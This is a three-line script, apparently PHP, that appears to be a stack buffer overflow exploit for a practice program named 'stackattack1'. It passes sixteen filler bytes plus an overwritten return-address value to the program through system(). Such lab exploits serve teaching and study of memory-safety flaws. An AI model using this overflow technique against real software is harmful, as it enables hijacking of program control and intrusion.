$arg = "ABCDEFGHIJKLMNOP"."\x17\x11\x40";
$cmd = "stackattack1 ".$arg;

system($cmd);